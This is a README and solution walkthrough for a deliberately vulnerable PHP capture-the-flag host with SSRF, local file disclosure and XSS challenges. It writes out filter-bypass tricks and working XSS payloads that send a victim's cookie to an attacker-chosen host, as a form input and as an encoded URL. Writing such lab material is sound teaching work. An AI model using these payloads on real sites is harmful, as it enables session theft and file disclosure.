# Super Secure Resource Finder
Written in PHP, there are 3 challenges on this host
- SSRF (medium) 
- LFD (easy) 
- XSS (easy)

## files
- Dockerfile: 		for deployment, sets the LFD flag in container's /etc/passwd
- files/index.php: 	the "homepage" which is vulnerable to ssrf 
- files/index2.php: the index.php of the internal host (gives clues to players)
- files/admin.php: 	flag file on internal host
- files/flag.php: 	red herring 
- triggerxss.py: 	script/bot used to trigger XSS payloads, contains flag cookie
- 000-default.conf: edited version of sites-enabled file for Apache to support internal and external hosts
- chromedriver.zip: contains chromedriver binary because Docker ~is retarded~ doesn't support unzipping during buildtime but supports untar-ing
- solver.py: 		solver script, will be added later when I have time, checks challenge health and solvability 
  
## how2solve
**== SSRF FLAG ==**  
- using index.php try requesting some localhost stuff
- realise that its being filtered
- try using 0.0.0.0 instead
- the flag can be found at `0.0.0.0/admin.php`
  
**== LFD FLAG ==**     
- try the payload file:///etc/passwd
- the word "file" will get filtered out
- stack the payload ie. `fi(file)le:///etc/passwd`
- the flag can be found in /etc/passwd
  
**== XSS FLAG ==**  
- whenever localhost or 127.0.0.1 is used, an admin will be called to inspect the page
- simply XSS the cookie
- script is filtered out so either
	- stack the payload: `<scriscriptipt>` 
	- or just use `<img>` tags
	- or use `<sCrIpT>` it works 
- example payload:
	- (typed into submit form): `<img src=x onerror="document.location.replace('http://<YOURLOCATIONHERE>/?'+document.cookie)"><localhost>`
	- as GET request: `http://challenge.name/?page=%3CscrIpt%3Edocument.location.replace%28%27http%3A//%3C[YOURLOCATIONHERE]%3E/%3F%27%2Bdocument.cookie%29%3C/scRipT%3E%3Clocalhost%3E `

